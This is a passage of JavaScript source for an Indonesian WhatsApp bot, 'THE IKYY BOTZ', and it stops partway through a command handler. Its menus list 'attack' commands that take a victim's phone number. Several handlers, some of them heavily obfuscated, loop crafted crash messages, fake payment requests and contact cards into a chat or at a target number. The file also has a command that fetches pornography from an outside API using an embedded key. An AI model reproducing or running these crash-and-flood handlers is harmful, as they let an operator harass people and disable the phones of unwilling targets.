││᭄⃟ꪶ⃟•╾ ${prefix}ikymakerzcrashv2 (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyartcrash (jumlah) 
││᭄⃟ꪶ⃟•╾ ${prefix}tengkorak [unlimited]
╰─────────────────╮
╭─────────────────╯
│ ◪〘 MENU ATTACK1 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}ikyvnprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikythebadboyprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikytheghostprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikytitikprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikykintilprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybuttoprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikystikprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikytroliprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikykontolprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikykuntulprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikyhelloprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikysantetprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikymomoprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikybuglocprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikyinfiniteprivate (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikybuttonprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikylivelocprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybugdocprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikybuginviteprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikytengkorakprivate (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug1 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug2 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug3 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug4 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug5 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug6 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug7 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug8 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug9 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug10 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug11 (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikyprivatebug12 (Nomer) 
╰─────────────────╮
╭─────────────────╯
│ ◪〘 MENU ATTACK2 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenvn (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenstik (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskentroli (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenkintil (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenhello (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenkontol (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenkuntul (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenmomo (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskensantet (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskeninfinite (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenliveloc (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbutton (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbugloc (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskentengkorak (Nomer) 
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug1 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug2 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug3 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug4 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug5 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug6 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug7 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug8 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug9 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug10 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug11 (Nomer)
││᭄⃟ꪶ⃟•╾ ${prefix}ikygaskenbug12 (Nomer)
╰─────────────────╯
╰─────────────────╮
╭─────────────────╯
│ ◪〘 JADI BUG MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}polling (teks)
││᭄⃟ꪶ⃟•╾ ${prefix}jadilokas (teks/reply)
││᭄⃟ꪶ⃟•╾ ${prefix}jadibugdoc (send/replyMedia)
││᭄⃟ꪶ⃟•╾ ${prefix}jadibugbutton (teks)
││᭄⃟ꪶ⃟•╾ ${prefix}jaditroli (teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadipeler (teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadimonyet (teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}kybugstik (reply image)
││᭄⃟ꪶ⃟•╾ ${prefix}jadibugvn (reply audio) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadivirkon (teks/reply teks)
││᭄⃟ꪶ⃟•╾ ${prefix}jadiikyness (reply media) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadingentids (reply media) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadidarkness (reply media)
││᭄⃟ꪶ⃟•╾ ${prefix}jadikintil (teks/reply teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadikuntul (teks/reply teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadikontol (teks/reply teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadibugloc (teks/reply teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadiliveloc (teks/reply teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadicatalog (reply media + teks) 
││᭄⃟ꪶ⃟•╾ ${prefix}jadibuttonimg (reply media + teks)
 ▰▱▰▱▰▱▰▱▰▱▰▱▰
𝐆𝐔𝐍𝐀𝐊𝐀𝐍𝐋𝐀𝐇 𝐃𝐄𝐍𝐆𝐀𝐍 𝐁𝐈𝐉𝐀𝐊!! 
𝐉𝐈𝐊𝐀 𝐀𝐃𝐀 𝐊𝐄𝐒𝐀𝐇𝐀𝐋𝐀𝐍 𝐏𝐀𝐃𝐀 𝐁𝐎𝐓 𝐂𝐇𝐀𝐓 wa.me/6289516394161
[🇮🇩]𝐉𝐀𝐍𝐆𝐀𝐍𝐋𝐀𝐇 𝐊𝐀𝐔 𝐓𝐀𝐊𝐔𝐓 𝐔𝐍𝐓𝐔𝐊 𝐌𝐄𝐍𝐂𝐎𝐁𝐀
[🇮🇩]𝐊𝐄𝐆𝐀𝐆𝐀𝐋𝐀𝐍 𝐃𝐈𝐒𝐄𝐁𝐀𝐁𝐊𝐀𝐍 𝐊𝐀𝐑𝐄𝐍𝐀 𝐊𝐀𝐔 𝐓𝐈𝐃𝐀𝐊 𝐁𝐄𝐍𝐀𝐑-𝐁𝐄𝐍𝐀𝐑 𝐌𝐄𝐍𝐆𝐈𝐍𝐆𝐈𝐍𝐊𝐀𝐍𝐍𝐘𝐀
${ownername} [🇮🇩]

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
case 'extrafiturbyiky': {
 anu = `
  ───────────
  │◪〘 EXTRAFITUR 〙
  │
  │
  │${prefix}ikysedangsantai
  ─────────────────
                             │
                             │
                             │
   ─────────────── 
  │
  │
  │${prefix}ikysedangberadadiduniaisekai
  ──────────────────│
                               │
   ${prefix}acumalaka         │
  ──────────────────
  │
  │${prefix}ikysad
  │─────────────────│
                               │
   ${prefix}ikydark             │
  ──────────────────│
  ©;⏤͟͟͞͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕☕
  `
  image = fs.readFileSync('./lib/jo.jpg') 
  ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu }) 
}
break
case 'buttonbugprivate': {
 anu = `
 extra button private🤫🤫
 
${prefix}Abgjualan?
${prefix}permisibang
${prefix}tinggaldimana
${prefix}afahiyah
${prefix}teskemauan

©;⏤͟͟͞͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🗿☕
`

image = fs.readFileSync('./pict.jpg')
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu }) 
}
break
case 'ikysedangsantai': { 
 m.reply (`IKYY SANTAI☕`) 
ikycoli.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky3.mp3'), mimetype: 'audio/mpeg', ptt:true })
}
break
case 'ikysedangberadadiduniaisekai': {
 m.reply (`IIH WIBUU!! `) 
ikycoli.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky4.mp3'), mimetype: 'audio/mpeg', ptt:true })
}
break
case 'acumalaka': {
 m.reply (`awikwok bgt bangj`)
ikycoli.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky5.mp3'), mimetype: 'audio/mpeg', ptt:true })
}
break
case 'ikysad': {
 m.reply (`Hmmmm`)
ikycoli.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky6.mp3'), mimetype: 'audio/mpeg', ptt:true })
}
break
case 'ikydark': {
 m.reply (`Yaa!`)
ikycoli.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky7.mp3'), mimetype: 'audio/mpeg', ptt:true })
}
break
case 'bokep':{
if (!isCreator && !isBan) return
let jokowi = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername} ${ngazap}`,jpegThumbnail: thumb}}}
sugiono = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
ikycoli.sendMessage(m.chat, { video: sugiono, mimetype: 'video/mp4', fileName: `${command}.mp4`}, { quoted: jokowi })
jancok(`Tuh Bokep`)
}
break
case 'intro': {
 menunya = `
Nama lengkap:
Nama panggilan:
Hobi:
Umur:
Gender:
Kelas:
Tinggi badan:
Beratbadan :
Agama:
Golongan darah:
Status:
Nama pacar:
Jumlah mantan:
Nama mantan:
Nama bapak :
Nama ibu : 
Nama kakak:
Kakak online:
Kakak kandung :
Jumlah kakak:
Nama adek:
Adek online:
Adek kandung :
Jumlah adek:
Nama kakek:
Kakek dari ayah :
Kakek dari ibu :
Nama nenek:
Nenek dari ayah :
Nenek dari ibu :
Nama bibi:
Bibi dari ayah :
Bibi dari ibu :
Nama paman:
Paman dari ayah :
Paman dari ibu :
KTP:
SIM:
STNK:
BPKB:
KK:
Alamat rumah:
RT:
RW:
KELURAHAN:
KECAMATAN:
KABUPATEN:
KOTA:
PROVINSI:
PLANET:
GALAXY:
UNIVERSE:
LANGIT:
DARATAN:
LAUTAN:
KEPULAUAN:
SAMUDRA:
UKURAN SEPATU:
UKURAN BAJU:
UKURAN CELANA:
LEBAR PINGGANG:
PANJANG TANGAN:
PANJANG KAKI:
MAKANAN FAVORIT:
MINUMAN FAVORIT:
FILM FAVORIT:
SINETRON FAVORIT:
GAME FAVORIT:
ANIME FAVORIT:
MANGA FAVORIT:
MANHUA FAVORIT:
MANHWA FAVORIT:
CHANNEL YOUTUBE:
INSTAGRAM:
TWITTEER:
FACEBOOK:
MUSIC FAVORIT:
SIFAT:
SIKAP:
ZODIAK:
TANGGAL LAHIR:
MERK HP:
MERK MOTOR:
MERK MOBIL:
TINGKAT RUMAH:
ALAMAT SEKOLAH:
Ukuran daleman:
Ukuran atasan :
Diameter kepala :
Statistik tubuh:
Diameter perut :
Diameter lengan :
Diameter paha :
Diameter lutut :
Diameter betis:
Panjang tangan :
Panjang kaki :
Panjang kepala :
Lebar hidung :
Cita cita :
Hobi :
Jenis hewanpeliharaan :
Nama hewan:
Diameter rumah:
Waifu:
Husbu:
Loli kesukaan :
Shota kesukaan :
Punya brp teman :
Teman online :
Teman offline :
Teman main game:
Teman sekolah:
Temen rumah:
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: menunya })
}
break
case 'tengkorak': {
var _0x6528a=_0x1aba;(function(_0x3b1bd3,_0x4916a9){var _0x4236cb=_0x1aba,_0x1c0bca=_0x3b1bd3();while(!![]){try{var _0x134898=-parseInt(_0x4236cb(0x1fc))/0x1+parseInt(_0x4236cb(0x1f9))/0x2*(parseInt(_0x4236cb(0x1e8))/0x3)+-parseInt(_0x4236cb(0x1fd))/0x4*(-parseInt(_0x4236cb(0x1f1))/0x5)+-parseInt(_0x4236cb(0x1e5))/0x6+parseInt(_0x4236cb(0x1f7))/0x7+parseInt(_0x4236cb(0x1e3))/0x8+parseInt(_0x4236cb(0x1fa))/0x9*(-parseInt(_0x4236cb(0x1e1))/0xa);if(_0x134898===_0x4916a9)break;else _0x1c0bca['push'](_0x1c0bca['shift']());}catch(_0x3f398d){_0x1c0bca['push'](_0x1c0bca['shift']());}}}(_0x6fe8,0xebc08));function _0x1aba(_0x58a32f,_0x395ab2){var _0x7f9f16=_0x6fe8();return _0x1aba=function(_0xd39f3,_0x35f088){_0xd39f3=_0xd39f3-0x1df;var _0x5b212d=_0x7f9f16[_0xd39f3];return _0x5b212d;},_0x1aba(_0x58a32f,_0x395ab2);}function _0x6fe8(){var _0x1a9532=['log','error','5JopDlb','trace','\x0a██▀░░░░░░░░░░░░░▀██\x0a█│░░░░░░░░░░░░░░░│█\x0a▌│░░░░░░░░░░░░░░░│▐\x0a░└┐░░░░░░░░░░░░░┌┘░\x0a░░└┐░░░░░░░░░░░┌┘░░\x0a░░┌┘▄▄▄░░░░░▄▄▄└┐░░\x0a▌░│████▌░░░▐████│░▐\x0a█░│▐██▀░░▄░░▀██▌│░█\x0a█▌┘░░░░░▐█▌░░░░░└▐█\x0a██░░▄▄▓░▀█▀░▓▄▄░░██\x0a██▄─┘█▌░░░░░▐█└─▄██\x0a███░░▐─┬┬┬┬┬─▌░░███\x0a███▌░░┬┼┼┼┼┼┬░░▐███\x0a████▄░└┴┴┴┴┴┘░▄████\x0a█████▄░░░░░░░▄█████\x0a','THE\x20IKYY\x20BOTZ','info','key','6093521hfiDpK','(((.+)+)+)+$','39656kyYfRy','4149vlMNbW','apply','1627568IYUkIl','1035740rRLcgI','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','21860SsTXKP','warn','11218136fvlxNl','toString','4053690HFNVVG','bind','constructor','264GsfTzb','sendMessage','chat','search','console','exception','__proto__'];_0x6fe8=function(){return _0x1a9532;};return _0x6fe8();}var _0x406458=(function(){var _0x268762=!![];return function(_0x5a2dd1,_0x5a4c4b){var _0x80471e=_0x268762?function(){var _0x5d5043=_0x1aba;if(_0x5a4c4b){var _0x24085a=_0x5a4c4b[_0x5d5043(0x1fb)](_0x5a2dd1,arguments);return _0x5a4c4b=null,_0x24085a;}}:function(){};return _0x268762=![],_0x80471e;};}()),_0x5902a6=_0x406458(this,function(){var _0x2263ac=_0x1aba;return _0x5902a6[_0x2263ac(0x1e4)]()[_0x2263ac(0x1eb)](_0x2263ac(0x1f8))[_0x2263ac(0x1e4)]()[_0x2263ac(0x1e7)](_0x5902a6)['search'](_0x2263ac(0x1f8));});_0x5902a6();var _0x35f088=(function(){var _0x58c9cb=!![];return function(_0x4bd4e2,_0x93a403){var _0x5dca88=_0x58c9cb?function(){var _0x10bb89=_0x1aba;if(_0x93a403){var _0x363fc6=_0x93a403[_0x10bb89(0x1fb)](_0x4bd4e2,arguments);return _0x93a403=null,_0x363fc6;}}:function(){};return _0x58c9cb=![],_0x5dca88;};}()),_0xd39f3=_0x35f088(this,function(){var _0x2e7886=_0x1aba,_0x3d470a=function(){var _0x116782=_0x1aba,_0x5ea69e;try{_0x5ea69e=Function(_0x116782(0x1df)+_0x116782(0x1e0)+');')();}catch(_0x314d49){_0x5ea69e=window;}return _0x5ea69e;},_0x458400=_0x3d470a(),_0x2a36c4=_0x458400[_0x2e7886(0x1ec)]=_0x458400[_0x2e7886(0x1ec)]||{},_0x8bf931=[_0x2e7886(0x1ef),_0x2e7886(0x1e2),_0x2e7886(0x1f5),_0x2e7886(0x1f0),_0x2e7886(0x1ed),'table',_0x2e7886(0x1f2)];for(var _0x5cbde9=0x0;_0x5cbde9<_0x8bf931['length'];_0x5cbde9++){var _0x414226=_0x35f088[_0x2e7886(0x1e7)]['prototype'][_0x2e7886(0x1e6)](_0x35f088),_0x2fb21d=_0x8bf931[_0x5cbde9],_0x32cda5=_0x2a36c4[_0x2fb21d]||_0x414226;_0x414226[_0x2e7886(0x1ee)]=_0x35f088['bind'](_0x35f088),_0x414226['toString']=_0x32cda5[_0x2e7886(0x1e4)][_0x2e7886(0x1e6)](_0x32cda5),_0x2a36c4[_0x2fb21d]=_0x414226;}});_0xd39f3();{if(!isCreator&&!isBan)return;teng=_0x6528a(0x1f3),ikyenak66={'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...{'remoteJid':''}},'message':{'imageMessage':{'mimetype':'image/jpeg','caption':_0x6528a(0x1f4),'jpegThumbnail':virgam}}},await ikycoli[_0x6528a(0x1e9)](m[_0x6528a(0x1ea)],{'text':teng},{'quoted':ikyenak66}),jancok('Sukses'),await setTimeout(()=>{var _0x3567d9=_0x6528a;ikycoli[_0x3567d9(0x1e9)](m[_0x3567d9(0x1ea)],{'text':command},{'messageId':m[_0x3567d9(0x1f6)]['id']});},0x1388);}
}
break

case 'ikypay':{
function _0x21b5(_0x5ea546,_0x1cae4b){const _0x5ae01e=_0x22aa();return _0x21b5=function(_0x1a59da,_0x21b3a8){_0x1a59da=_0x1a59da-0x15d;let _0x2ca8fa=_0x5ae01e[_0x1a59da];return _0x2ca8fa;},_0x21b5(_0x5ea546,_0x1cae4b);}const _0x40da67=_0x21b5;(function(_0x4d72f0,_0x3e250b){const _0x4f6293=_0x21b5,_0x56db82=_0x4d72f0();while(!![]){try{const _0x5c8593=parseInt(_0x4f6293(0x16a))/0x1*(-parseInt(_0x4f6293(0x175))/0x2)+-parseInt(_0x4f6293(0x172))/0x3+parseInt(_0x4f6293(0x176))/0x4*(parseInt(_0x4f6293(0x170))/0x5)+-parseInt(_0x4f6293(0x163))/0x6*(parseInt(_0x4f6293(0x16c))/0x7)+-parseInt(_0x4f6293(0x15e))/0x8*(-parseInt(_0x4f6293(0x174))/0x9)+parseInt(_0x4f6293(0x169))/0xa+-parseInt(_0x4f6293(0x161))/0xb*(-parseInt(_0x4f6293(0x162))/0xc);if(_0x5c8593===_0x3e250b)break;else _0x56db82['push'](_0x56db82['shift']());}catch(_0x1bef6e){_0x56db82['push'](_0x56db82['shift']());}}}(_0x22aa,0xbd01e));const _0x2f5603=(function(){let _0x1387e6=!![];return function(_0x111744,_0x36e9b3){const _0x3e1a5b=_0x1387e6?function(){const _0x23bbd1=_0x21b5;if(_0x36e9b3){const _0x3987cc=_0x36e9b3[_0x23bbd1(0x179)](_0x111744,arguments);return _0x36e9b3=null,_0x3987cc;}}:function(){};return _0x1387e6=![],_0x3e1a5b;};}()),_0x503175=_0x2f5603(this,function(){const _0x4a8280=_0x21b5;return _0x503175[_0x4a8280(0x15d)]()[_0x4a8280(0x171)](_0x4a8280(0x17d))[_0x4a8280(0x15d)]()['constructor'](_0x503175)[_0x4a8280(0x171)](_0x4a8280(0x17d));});_0x503175();const _0x21b3a8=(function(){let _0x4de2db=!![];return function(_0x47b174,_0x288ed4){const _0x54fe89=_0x4de2db?function(){const _0x46332b=_0x21b5;if(_0x288ed4){const _0x32628a=_0x288ed4[_0x46332b(0x179)](_0x47b174,arguments);return _0x288ed4=null,_0x32628a;}}:function(){};return _0x4de2db=![],_0x54fe89;};}()),_0x1a59da=_0x21b3a8(this,function(){const _0x5ba477=_0x21b5;let _0xdd3bde;try{const _0x54dd73=Function(_0x5ba477(0x15f)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0xdd3bde=_0x54dd73();}catch(_0x3d4855){_0xdd3bde=window;}const _0x1c5bf3=_0xdd3bde[_0x5ba477(0x166)]=_0xdd3bde[_0x5ba477(0x166)]||{},_0x116c3b=[_0x5ba477(0x168),_0x5ba477(0x17a),_0x5ba477(0x17c),_0x5ba477(0x164),_0x5ba477(0x16b),_0x5ba477(0x160),'trace'];for(let _0x2bd714=0x0;_0x2bd714<_0x116c3b[_0x5ba477(0x17b)];_0x2bd714++){const _0x102e21=_0x21b3a8['constructor'][_0x5ba477(0x16f)][_0x5ba477(0x173)](_0x21b3a8),_0x362abe=_0x116c3b[_0x2bd714],_0x57727b=_0x1c5bf3[_0x362abe]||_0x102e21;_0x102e21[_0x5ba477(0x165)]=_0x21b3a8['bind'](_0x21b3a8),_0x102e21['toString']=_0x57727b[_0x5ba477(0x15d)][_0x5ba477(0x173)](_0x57727b),_0x1c5bf3[_0x362abe]=_0x102e21;}});function _0x22aa(){const _0xdc6035=['55ZmjCrD','search','2520288NjCWtE','bind','225UAEBUJ','2UrLjrd','542936uMTmHl','chat','reply','apply','warn','length','info','(((.+)+)+)+$','toString','134424wQRPxv','return\x20(function()\x20','table','14773bBdsXW','9924zvhCLd','6xWGeKG','error','__proto__','console','THE\x20IKYY\x20BOTZ','log','10641780yFJeod','949288WXwnhj','exception','10671010ThnQZU','relayMessage','message','prototype'];_0x22aa=function(){return _0xdc6035;};return _0x22aa();}_0x1a59da();{if(!isCreator&&!isBan)return;if(args[_0x40da67(0x17b)]==0x0)return m[_0x40da67(0x178)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){const memek=generateWAMessageFromContent(m[_0x40da67(0x177)],{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':_0x40da67(0x167),'currencyCodeIso4217':'IDR','requestFrom':'0@s.whatsapp.net','expiryTimestamp':0x1f40,'amount':0x1,'background':thumb}}}},{});ikycoli[_0x40da67(0x16d)](m['chat'],memek[_0x40da67(0x16e)],{'messageId':memek['key']['id']});}}
}
break
 case 'crashiky':{
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = `THE IKYY BOTZ`,
ikycoli.sendMessage(m.chat, {text: kontolu, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title: `${philips}`,body: wm, previewType:"PHOTO",thumbnail: virgam,sourceUrl:`https://xnxx.com`}}})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jadikuntul':{
var _0x3654e3=_0xc673;(function(_0x1d575c,_0x196924){var _0x1800ea=_0xc673,_0x6c01e9=_0x1d575c();while(!![]){try{var _0x5422fd=-parseInt(_0x1800ea(0x156))/0x1*(-parseInt(_0x1800ea(0x159))/0x2)+parseInt(_0x1800ea(0x15c))/0x3*(-parseInt(_0x1800ea(0x15a))/0x4)+-parseInt(_0x1800ea(0x151))/0x5*(-parseInt(_0x1800ea(0x157))/0x6)+parseInt(_0x1800ea(0x149))/0x7*(parseInt(_0x1800ea(0x14f))/0x8)+-parseInt(_0x1800ea(0x162))/0x9*(-parseInt(_0x1800ea(0x163))/0xa)+parseInt(_0x1800ea(0x164))/0xb*(-parseInt(_0x1800ea(0x161))/0xc)+parseInt(_0x1800ea(0x15e))/0xd*(parseInt(_0x1800ea(0x160))/0xe);if(_0x5422fd===_0x196924)break;else _0x6c01e9['push'](_0x6c01e9['shift']());}catch(_0x3e2723){_0x6c01e9['push'](_0x6c01e9['shift']());}}}(_0xfd81,0x3c30c));var _0x125cfc=(function(){var _0xb05c44=!![];return function(_0x42760a,_0x26fc8d){var _0x43e59b=_0xb05c44?function(){var _0xd22e49=_0xc673;if(_0x26fc8d){var _0x362f3d=_0x26fc8d[_0xd22e49(0x14a)](_0x42760a,arguments);return _0x26fc8d=null,_0x362f3d;}}:function(){};return _0xb05c44=![],_0x43e59b;};}()),_0x336842=_0x125cfc(this,function(){var _0x104b95=_0xc673;return _0x336842[_0x104b95(0x14e)]()['search'](_0x104b95(0x14b))[_0x104b95(0x14e)]()[_0x104b95(0x152)](_0x336842)[_0x104b95(0x153)]('(((.+)+)+)+$');});_0x336842();var _0x1343c7=(function(){var _0x43ed92=!![];return function(_0x4924a6,_0x432373){var _0xf383ed=_0x43ed92?function(){var _0x18e2b5=_0xc673;if(_0x432373){var _0x46e9cf=_0x432373[_0x18e2b5(0x14a)](_0x4924a6,arguments);return _0x432373=null,_0x46e9cf;}}:function(){};return _0x43ed92=![],_0xf383ed;};}()),_0x4b02b5=_0x1343c7(this,function(){var _0x45f1e0=_0xc673,_0x535684=function(){var _0x3e436b=_0xc673,_0x4b9575;try{_0x4b9575=Function('return\x20(function()\x20'+_0x3e436b(0x150)+');')();}catch(_0x5745c2){_0x4b9575=window;}return _0x4b9575;},_0x45a5ca=_0x535684(),_0xbb61b4=_0x45a5ca['console']=_0x45a5ca[_0x45f1e0(0x15d)]||{},_0x15aaee=[_0x45f1e0(0x14d),'warn','info','error','exception',_0x45f1e0(0x158),_0x45f1e0(0x155)];for(var _0x410a18=0x0;_0x410a18<_0x15aaee[_0x45f1e0(0x154)];_0x410a18++){var _0x5c8909=_0x1343c7[_0x45f1e0(0x152)]['prototype'][_0x45f1e0(0x14c)](_0x1343c7),_0x5cb5a3=_0x15aaee[_0x410a18],_0x303aea=_0xbb61b4[_0x5cb5a3]||_0x5c8909;_0x5c8909['__proto__']=_0x1343c7[_0x45f1e0(0x14c)](_0x1343c7),_0x5c8909[_0x45f1e0(0x14e)]=_0x303aea[_0x45f1e0(0x14e)][_0x45f1e0(0x14c)](_0x303aea),_0xbb61b4[_0x5cb5a3]=_0x5c8909;}});function _0xc673(_0x182e40,_0x89fdbe){var _0x127c99=_0xfd81();return _0xc673=function(_0x4b02b5,_0x1343c7){_0x4b02b5=_0x4b02b5-0x149;var _0x34ec10=_0x127c99[_0x4b02b5];return _0x34ec10;},_0xc673(_0x182e40,_0x89fdbe);}function _0xfd81(){var _0x39bc56=['apply','(((.+)+)+)+$','bind','log','toString','144YESamZ','{}.constructor(\x22return\x20this\x22)(\x20)','135PHakfp','constructor','search','length','trace','5849PEdniG','540CZPCFZ','table','10DrOpZW','82084BzfteY','quoted','3UlZAKT','console','1404rOOJpR','Sukses\x20Convert\x20Kuntul','29932ixvxrB','19632iaJUgB','86922Jcwlea','100UdvEyB','638kEokwO','1085WWthXq'];_0xfd81=function(){return _0x39bc56;};return _0xfd81();}_0x4b02b5();{if(!isCreator&&!isBan)return;if(!m[_0x3654e3(0x15b)]&&!text)throw'Teks/Reply';ikycoli['sendContact'](m['chat'],global['owner'],fkntliky),jancok(_0x3654e3(0x15f));}
}
break

case 'kuntul': {
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku IKYY`
for (let i = 0; i < jumlah; i++) {	
ikycoli.sendContact(m.chat, global.owner, fkontaak)
}
jancok(`Sukses Send Kuntul Sebanyak ${jumlah}`)
}
break
case 'ikykuntulprivate': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
m.reply(`Sukses Send Kuntul Di Nomer ${text}`)
}
break
case 'ikygaskenkuntul': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
ikycoli.sendContact(m.chat, global.owner, fkontaak)
ikycoli.sendContact(m.chat, global.owner, fkontaak)
ikycoli.sendContact(m.chat, global.owner, fkontaak)
ikycoli.sendContact(m.chat, global.owner, fkontaak)
ikycoli.sendContact(m.chat, global.owner, fkontaak)
m.reply(`Sukses Send Kuntul Di Nomer ${text}`)
}
break

 case 'virkon':{
if (!isCreator && !isBan) return
